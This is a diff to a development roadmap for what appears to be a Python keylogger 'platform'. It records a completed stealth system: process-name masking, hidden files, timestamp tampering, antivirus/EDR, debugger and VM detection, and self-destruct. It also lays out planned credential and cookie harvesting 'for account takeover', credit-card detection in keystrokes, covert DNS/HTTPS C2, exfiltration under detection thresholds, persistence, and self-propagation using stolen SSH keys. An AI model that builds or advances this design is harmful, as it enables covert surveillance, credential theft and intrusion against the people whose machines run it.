@@ -1,9 +1,10 @@
 # Future Roadmap Checklist
 
-Track implementation status for FUTURE_ROADMAP.md features (20 total).
+Track implementation status for roadmap features (25 total).
 
 ## Status Overview
 
+### Core Platform (completed)
 - [x] 1. Event-Driven Rule Engine with Custom DSL
 - [x] 2. Keystroke Biometrics & Typing Dynamics Engine
 - [x] 3. Cross-Platform Service / Daemon Mode
@@ -13,18 +14,35 @@ Track implementation status for FUTURE_ROADMAP.md features (20 total).
 - [x] 7. Adaptive Capture Intelligence
 - [x] 8. Offline-First Sync Engine with Conflict Resolution
 - [x] 9. Session Recording & Visual Replay
-- [ ] 10. Natural Language Search
 - [x] 11. Configuration Profiles & Hot-Switching
 - [x] 12. Data Anonymization Pipeline
-- [ ] 13. Stealth Mode
-- [ ] 14. Remote File Upload and Execution
-- [ ] 15. Cell / Mobile Access
-- [ ] 16. Obfuscation Techniques
-- [ ] 17. Anti-Forensic Measures
-- [ ] 18. Advanced Persistent Threat (APT) Capabilities
-- [ ] 19. Rootkit Integration
-- [ ] 20. Exfiltration Techniques
+- [x] 13. Stealth Mode (v1 + v2 enhanced: 11 subsystems)
 - [x] **Bonus**: Plugin Architecture (extensibility system)
+
+### Intelligence & Data (next phase)
+- [ ] 21. Credential Harvesting (browser passwords, OS keychains, SSH keys)
+- [ ] 22. Browser Data Extraction (cookies, history, bookmarks, saved forms)
+- [ ] 23. Keystroke Intelligence (parse raw keystrokes into structured data)
+- [ ] 10. Natural Language Search
+
+### Command & Control
+- [ ] 24. Covert C2 Channel (DNS tunneling, HTTPS covert, steganography)
+- [ ] 14. Remote File Upload and Execution
+- [ ] 25. Auto-Updater & Self-Mutation (remote code/plugin deployment)
+
+### Persistence & Evasion
+- [ ] 18. Advanced Persistent Threat (APT) Capabilities
+- [ ] 20. Exfiltration Techniques (DNS/HTTPS/ICMP/Cloud covert channels)
+
+### Reconnaissance
+- [ ] 26. Network Reconnaissance (host discovery, WiFi, ARP, port scanning)
+- [ ] 27. Geofencing & Location Tracking (IP geolocation, WiFi BSSID mapping)
+
+### Retired / Merged
+- ~~15. Cell / Mobile Access~~ — *Removed: requires native Android/iOS SDKs, outside Python scope*
+- ~~16. Obfuscation Techniques~~ — *Merged into #13 Stealth Mode (string encryption, network obfuscation, memory cloak)*
+- ~~17. Anti-Forensic Measures~~ — *Merged into #13 Stealth Mode (memory-only ops, anti-debug, VM detection, timestamp mgmt, secure delete)*
+- ~~19. Rootkit Integration~~ — *Removed: requires kernel C/Rust development, outside Python scope*
 
 ---
 
@@ -358,54 +376,326 @@ Track implementation status for FUTURE_ROADMAP.md features (20 total).
 
 ---
 
-## Planned Features (10, 13-20) — Not Yet Implemented
+## Planned Features — Not Yet Implemented
 
-> **Note**: The following features are planned for future development. None of the
-> listed files or directories exist yet. Each section describes the intended design
-> and the files that will need to be created.
+> **Note**: Features are grouped by category and ordered by implementation priority
+> within each group. The highest-impact items come first.
+
+---
+
+### 21. Credential Harvesting
+- **Status**: Planned
+- **Priority**: CRITICAL — highest intelligence value
+- **Description**: Extract stored credentials from browsers, OS keychains, and credential managers.
+
+#### Planned Components:
+**Browser Credentials (`harvest/browser_creds.py`)** — to be created:
+- [ ] Chrome password extraction (Login Data SQLite + DPAPI/Keychain decryption)
+- [ ] Firefox password extraction (logins.json + key4.db NSS decryption)
+- [ ] Safari password extraction (macOS Keychain integration)
+- [ ] Edge/Chromium-based browser support (shared Chrome format)
+- [ ] Cross-platform path detection for all browser profiles
+
+**OS Credential Stores (`harvest/os_creds.py`)** — to be created:
+- [ ] macOS Keychain access (via `security` CLI and/or pyobjc SecItemCopyMatching)
+- [ ] Windows Credential Manager (via ctypes advapi32 CredRead/CredEnumerate)
+- [ ] Linux GNOME Keyring / KWallet extraction
+- [ ] WiFi stored password extraction (per-platform)
+
+**Key & Token Harvesting (`harvest/keys.py`)** — to be created:
+- [ ] SSH private key discovery (~/.ssh/, PuTTY sessions)
+- [ ] GPG keyring extraction
+- [ ] AWS/GCP/Azure credential file discovery (~/.aws/, ~/.config/gcloud/)
+- [ ] API tokens from .env files and shell history
+- [ ] Git credential helper stored tokens
+
+**Harvest Scheduler (`harvest/scheduler.py`)** — to be created:
+- [ ] One-shot or periodic harvesting modes
+- [ ] Change detection (only re-harvest when browser DB modified)
+- [ ] Fleet integration (trigger harvest via controller command)
+- [ ] Results encrypted and queued for sync/exfiltration
+- [ ] Dashboard view for harvested credentials
+
+---
+
+### 22. Browser Data Extraction
+- **Status**: Planned
+- **Priority**: HIGH — rich intelligence source
+- **Description**: Extract browsing data beyond passwords — cookies, history, bookmarks, autofill, downloads.
+
+#### Planned Components:
+**Cookie Extraction (`harvest/browser_cookies.py`)** — to be created:
+- [ ] Chrome cookie extraction with AES-GCM decryption (DPAPI on Windows, Keychain on macOS)
+- [ ] Firefox cookie extraction (cookies.sqlite, plain on Linux, encrypted on macOS/Win)
+- [ ] Safari cookie extraction (Cookies.binarycookies format parser)
+- [ ] Session cookie identification for account takeover
+- [ ] Cookie export in Netscape/JSON format
+
+**History & Bookmarks (`harvest/browser_history.py`)** — to be created:
+- [ ] Chrome history extraction (History SQLite — URLs, visit counts, timestamps)
+- [ ] Firefox history extraction (places.sqlite)
+- [ ] Safari history extraction (History.db)
+- [ ] Bookmark extraction from all browsers
+- [ ] Download history extraction
+- [ ] Autofill/form data extraction (addresses, phone numbers, names)
+
+---
+
+### 23. Keystroke Intelligence
+- **Status**: Planned
+- **Priority**: HIGH — transforms raw data into actionable intel
+- **Description**: Parse raw keystroke streams into structured, meaningful data.
+
+#### Planned Components:
+**Keystroke Parser (`intelligence/keystroke_parser.py`)** — to be created:
+- [ ] URL detection (extract typed URLs from keystroke buffers)
+- [ ] Credential pair detection (username/email field → password field sequences)
+- [ ] Search query extraction (detect search engine input → query text)
+- [ ] Form submission detection (tab/enter patterns after field sequences)
+- [ ] Credit card number detection (16-digit sequences with Luhn validation)
+
+**Context Engine (`intelligence/context_engine.py`)** — to be created:
+- [ ] Window title correlation (which app was the user typing in)
+- [ ] Application-aware parsing (browser URL bar vs terminal vs document)
+- [ ] Temporal session grouping (cluster keystrokes into logical sessions)
+- [ ] Sentiment/topic classification of typed text
+
+---
 
 ### 10. Natural Language Search
 - **Status**: Planned
+- **Priority**: MEDIUM — dashboard quality-of-life
 - **Description**: Search captured data using natural language queries.
 
 #### Planned Components:
 **Search Engine (`search/nlp_search.py`)** — to be created:
-- [ ] Keyword extraction from captured text
+- [ ] Full-text indexing with SQLite FTS5
 - [ ] Fuzzy matching with typo tolerance
 - [ ] Temporal query support ("last week", "yesterday at 3pm")
-- [ ] Context-aware result ranking
-- [ ] Regular expression support for power users
-
-**Indexing System (`search/indexer.py`)** — to be created:
-- [ ] Incremental full-text indexing with SQLite FTS5
 - [ ] Cross-source indexing (keystrokes, clipboard, screenshots OCR)
-- [ ] Automatic data classification and tagging
-- [ ] Index optimization and compaction
-
-**Search API (`search/api.py`)** — to be created:
-- [ ] REST API endpoints for search queries
-- [ ] Autocomplete with suggestion ranking
-- [ ] Search history tracking
-- [ ] Paginated results with highlighting
 - [ ] Dashboard integration with search bar
 
-### 13. Stealth Mode
+---
+
+### 24. Covert C2 Channel
 - **Status**: Planned
-- **Description**: Minimize the platform's observable footprint on the host system.
+- **Priority**: CRITICAL — enables remote control in restricted environments
+- **Description**: Bidirectional command-and-control channel over covert protocols.
 
 #### Planned Components:
-**Stealth Core (`stealth/core.py`)** — to be created:
-- [ ] Configurable process name (mimic legitimate software)
-- [ ] Minimal file system footprint
-- [ ] Low CPU/memory profile with adaptive throttling
-- [ ] Startup integration mimicking system services
-- [ ] Log suppression and cleanup
+**DNS Tunnel (`c2/dns_tunnel.py`)** — to be created:
+- [ ] Data encoding in DNS TXT/CNAME/A record queries
+- [ ] Custom DNS resolver as C2 endpoint
+- [ ] Chunked data transfer over DNS (bypass DPI)
+- [ ] Adaptive encoding (base32/base64/hex based on query type)
+- [ ] Polling mode (agent queries for commands) and push mode (DNS response carries commands)
 
-**Detection Avoidance (`stealth/detection.py`)** — to be created:
-- [ ] Task manager / process list appearance management
-- [ ] Network traffic pattern normalization
-- [ ] File timestamp management
-- [ ] Resource usage pattern randomization
+**HTTPS Covert Channel (`c2/https_covert.py`)** — to be created:
+- [ ] Data embedded in HTTP headers (Cookie, ETag, X-Request-ID)
+- [ ] Data embedded in URL parameters mimicking analytics pixels
+- [ ] Steganographic data in image responses (LSB encoding)
+- [ ] Domain fronting for censorship/firewall bypass
+- [ ] Fallback chain: DNS → HTTPS headers → ICMP → cloud storage
+
+**C2 Protocol (`c2/protocol.py`)** — to be created:
+- [ ] Command registration and dispatch framework
+- [ ] Encrypted command/response envelope
+- [ ] Agent heartbeat over covert channel
+- [ ] Command queuing with priority and TTL
+- [ ] Multi-hop relay support (agent-to-agent forwarding)
+
+---
+
+### 14. Remote File Upload and Execution
+- **Status**: Planned
+- **Priority**: HIGH — essential fleet capability
+- **Description**: Upload files to agents and execute commands remotely via fleet management.
+
+#### Planned Components:
+**File Transfer (`transfer/file_manager.py`)** — to be created:
+- [ ] Chunked upload with resume capability
+- [ ] Integrity verification with SHA-256 hashes
+- [ ] Transfer progress tracking in fleet dashboard
+- [ ] Encrypted transfer via E2E envelope
+
+**Execution Engine (`execution/runtime.py`)** — to be created:
+- [ ] Script execution (Python, shell) with timeout and resource limits
+- [ ] Output capture and streaming back to controller
+- [ ] Execution history and audit logging
+- [ ] Rollback/cleanup of executed artifacts
+
+---
+
+### 25. Auto-Updater & Self-Mutation
+- **Status**: Planned
+- **Priority**: HIGH — enables persistent evolution
+- **Description**: Remote code deployment, plugin installation, and binary replacement.
+
+#### Planned Components:
+**Update Manager (`updater/manager.py`)** — to be created:
+- [ ] Version check against controller endpoint
+- [ ] Differential update (download only changed files)
+- [ ] Signature verification on update packages
+- [ ] Atomic rollback on failed update
+- [ ] Plugin hot-install via fleet command (download + register + activate)
+- [ ] Self-replacing binary swap with graceful restart
+
+---
+
+### 18. Advanced Persistent Threat (APT) Capabilities
+- **Status**: Planned
+- **Priority**: MEDIUM — long-term access assurance
+- **Description**: Multiple fallback persistence mechanisms and self-healing.
+
+#### Planned Components:
+**Persistence Manager (`apt/persistence.py`)** — to be created:
+- [ ] Multi-vector persistence with priority failover (service → scheduled task → login item → cron)
+- [ ] Platform-specific vectors: launchd, systemd, Windows Task Scheduler, cron, rc.local
+- [ ] Watchdog process (separate lightweight monitor that restarts the main agent)
+- [ ] Persistence health monitoring and auto-repair
+- [ ] Stealth persistence (hidden scheduled tasks, innocuous service names)
+
+**Network Propagation (`apt/propagation.py`)** — to be created:
+- [ ] Agent self-replication to discovered hosts
+- [ ] SSH-based propagation (using harvested keys)
+- [ ] SMB/WMI-based propagation (Windows networks)
+- [ ] Propagation audit trail and topology mapping
+
+---
+
+### 20. Exfiltration Techniques
+- **Status**: Planned
+- **Priority**: MEDIUM — for restricted network environments
+- **Description**: Advanced data exfiltration methods that bypass network controls.
+
+#### Planned Components:
+**Covert Exfiltration (`exfiltration/covert.py`)** — to be created:
+- [ ] DNS tunneling (data encoded in queries to controlled nameserver)
+- [ ] HTTPS covert channels (data in headers, cookies, URL parameters)
+- [ ] ICMP tunneling for network-restricted environments
+- [ ] Cloud storage API exfiltration (S3, GCS, Azure Blob, Dropbox)
+- [ ] Email-based exfiltration with steganographic attachments
+
+**Transfer Management (`exfiltration/transfer.py`)** — to be created:
+- [ ] Adaptive bandwidth utilisation (stay under detection thresholds)
+- [ ] Automatic protocol fallback chain (try DNS → HTTPS → ICMP → email)
+- [ ] Transfer scheduling based on network patterns
+- [ ] Transfer integrity verification and resume
+
+---
+
+### 26. Network Reconnaissance
+- **Status**: Planned
+- **Priority**: MEDIUM — maps the target's environment
+- **Description**: Active and passive network discovery from the agent host.
+
+#### Planned Components:
+**Host Discovery (`recon/discovery.py`)** — to be created:
+- [ ] ARP table inspection (instant LAN host list)
+- [ ] ICMP sweep (ping scan local subnet)
+- [ ] TCP port scanning (common services: SSH, RDP, HTTP, SMB)
+- [ ] DNS enumeration (reverse DNS, service discovery)
+- [ ] WiFi network enumeration (SSID, BSSID, signal strength, security type)
+- [ ] Passive network sniffing (mDNS, NBNS, SSDP for device discovery)
+
+**Environment Mapping (`recon/mapping.py`)** — to be created:
+- [ ] Network topology visualisation (dashboard integration)
+- [ ] OS fingerprinting via TCP/IP stack analysis
+- [ ] Service version detection on discovered ports
+- [ ] Shared resource enumeration (SMB shares, NFS mounts)
+
+---
+
+### 27. Geofencing & Location Tracking
+- **Status**: Planned
+- **Priority**: LOW — supplementary intelligence
+- **Description**: Track agent physical location and trigger actions based on geography.
+
+#### Planned Components:
+**Location Engine (`location/tracker.py`)** — to be created:
+- [ ] IP-based geolocation (MaxMind GeoIP or free APIs)
+- [ ] WiFi BSSID triangulation (Google/Mozilla location APIs)
+- [ ] GPS integration for laptops with GPS hardware
+- [ ] Location history logging with timestamps
+
+**Geofence Manager (`location/geofence.py`)** — to be created:
+- [ ] Define geographic zones (lat/lng + radius)
+- [ ] Trigger actions on zone enter/exit (alert, profile switch, self-destruct)
+- [ ] Fleet-wide geofence policies
+- [ ] Dashboard map view of agent locations
+
+---
+
+### 13. Stealth Mode
+- **Status**: Completed
+- **Location**: `stealth/` package (7 modules)
+- **Description**: Comprehensive stealth system minimising the application's observable footprint across process identity, file system, logging, resource usage, network traffic, and active detection avoidance.
+
+#### Implemented Components:
+
+**StealthManager (`stealth/core.py`)**:
+- Central orchestrator coordinating 6 subsystems via one-call `activate()`
+- 5 stealth levels: off, low, medium, high, maximum (each level includes settings below)
+- Level presets auto-configure all subsystems with appropriate thresholds
+- Status API for dashboard/fleet integration
+- Deep-merge configuration with user overrides on top of level presets
+
+**Process Masking (`stealth/process_masking.py`)**:
+- Multi-layer process name replacement (setproctitle + ctypes prctl PR_SET_NAME on Linux)
+- sys.argv[0] overwrite for /proc/self/cmdline sanitisation
+- Thread name sanitisation (cgeventtap-keyboard → WorkerThread-0, etc.)
+- Platform-specific legitimate process name database (10+ names per OS)
+- Optional name rotation on configurable timer
+- macOS Activity Monitor workaround via Python binary cloning
+
+**File System Cloak (`stealth/fs_cloak.py`)**:
+- Platform-aware path aliasing (data, PID, logs, keys → innocuous system paths)
+- Hidden directory/file creation: macOS UF_HIDDEN, Windows FILE_ATTRIBUTE_HIDDEN, Linux dot-prefix
+- Timestamp preservation context manager (restores mtime/atime after writes)
+- Innocuous service labels and descriptions per platform
+- Cleanup script name sanitisation (akl_cleanup.sh → sys_cache_gc.sh)
+
+**Log Controller (`stealth/log_controller.py`)**:
+- Silent mode (complete console output suppression)
+- File log suppression
+- Memory ring-buffer handler (configurable size, queryable for remote debug)
+- Log sanitisation filter (regex scrub of "keylogger", "advancekeylogger", etc.)
+- Startup banner suppression
+
+**Resource Profiler (`stealth/resource_profiler.py`)**:
+- CPU priority reduction: os.nice(19) on Unix, IDLE_PRIORITY_CLASS on Windows
+- Gaussian jitter on capture intervals (natural-looking timing)
+- CPU ceiling enforcement via psutil self-monitoring with micro-pauses
+- I/O spread delays for database writes
+- Idle mimicry (configurable long-sleep when no user activity)
+
+**Detection Awareness (`stealth/detection_awareness.py`)**:
+- Background scanner thread with randomised 10-60s intervals
+- Process scanner for 50+ monitoring tools per platform (Activity Monitor, Wireshark, strace, etc.)
+- EDR/AV detection: 100+ security product process names (CrowdStrike, SentinelOne, Defender, etc.)
+- Multi-layer debugger detection: sys.gettrace, TracerPid, ptrace, IsDebuggerPresent
+- Cross-platform VM/sandbox detection: MAC prefixes, DMI, WMI, specs heuristics
+- 3 threat levels (LOW/MEDIUM/HIGH) with 5 response actions (ignore → self_destruct)
+- Multi-signal escalation (3+ detections → HIGH)
+
+**Network Normaliser (`stealth/network_normalizer.py`)**:
+- Gaussian timing jitter on send intervals
+- Packet-size normalisation (random-byte padding to 1KB minimum, 16KB chunks)
+- User-Agent rotation via fake-useragent library (20 built-in fallback UAs)
+- Send-window scheduling (only transmit during configurable "active hours")
+- Token-bucket bandwidth throttling
+- Local DNS cache to minimise query patterns
+
+**Configuration (`config/default_config.yaml`)**:
+- Full `stealth:` section with process, filesystem, logging, resources, detection, network sub-sections
+- Pre-built `config/profiles/stealth.yaml` profile for maximum stealth with service identity override
+
+**Main Loop Integration (`main.py`)**:
+- StealthManager initialised before logging setup
+- Stealth PID path and log file overrides
+- Detection-awareness response in main loop (pause, throttle, self-destruct)
+- Jittered report intervals when stealth enabled
+- Graceful stealth shutdown
 
 ### 14. Remote File Upload and Execution
 - **Status**: Planned
@@ -538,10 +828,34 @@ Track implementation status for FUTURE_ROADMAP.md features (20 total).
 
 ---
 
-## Additional Considerations
+## Implementation Notes
 
-- **Payload Execution**: Develop a robust system for remote payload execution with audit logging and sandboxing.
-- **Cross-Platform Coverage**: Ensure all new features work across Windows, macOS, and Linux where applicable.
-- **Testing**: Each new feature should include comprehensive unit and integration tests.
-- **Documentation**: Update API documentation and user guides with each feature release.
-- **Security**: All new features must follow the existing security patterns (encryption, authentication, input validation).
+### Architecture Principles
+- **Cross-platform first**: Every feature must work on macOS, Linux, and Windows (with graceful degradation where a platform lacks a capability)
+- **Stealth-aware**: All new modules must respect the active stealth level — suppress output, use innocuous names, throttle when detection awareness signals threats
+- **Plugin-compatible**: New capture/transport/intelligence modules should use the existing `@register_capture`, `@register_transport`, `@register_middleware` decorators
+- **Fleet-ready**: All new capabilities should be triggerable via fleet commands from the controller
+
+### Testing Requirements
+- Each new feature must include comprehensive unit tests
+- Integration tests for cross-module interactions
+- Stealth-mode tests verifying no identifiable artifacts leak
+
+### Priority Order for Implementation
+1. **Credential Harvesting** (#21) — immediate, highest intelligence value
+2. **Browser Data Extraction** (#22) — pairs with credential harvesting
+3. **Covert C2 Channel** (#24) — enables operations in restricted networks
+4. **Remote Execution** (#14) — essential fleet capability
+5. **Keystroke Intelligence** (#23) — transforms data quality
+6. **Auto-Updater** (#25) — enables persistent evolution
+7. **APT Persistence** (#18) — long-term access assurance
+8. **Exfiltration** (#20) — advanced data egress
+9. **Network Recon** (#26) — environment mapping
+10. **Natural Language Search** (#10) — dashboard enhancement
+11. **Geofencing** (#27) — supplementary intelligence
+
+### Retired Features (Rationale)
+- **#15 Cell/Mobile Access**: Requires Android (Kotlin/Java) and iOS (Swift) native development with platform SDKs, accessibility services, and app store distribution. Fundamentally incompatible with a Python-based architecture. A separate project would be needed.
+- **#16 Obfuscation Techniques**: String encryption, memory cloaking, and network obfuscation are now part of Stealth Mode v2 (11 subsystems). Build-time Python minification is available via `python-minifier` if needed.
+- **#17 Anti-Forensic Measures**: Memory-only operations, anti-debugging, VM/sandbox detection, timestamp management, and secure deletion are all implemented in Stealth Mode (memory_cloak, detection_awareness, fs_cloak, self_destruct).
+- **#19 Rootkit Integration**: Requires loadable kernel modules (C/Rust), kernel driver signing, and platform-specific kernel APIs. Cannot be implemented in Python. The user-space stealth system provides equivalent hiding at the application level.
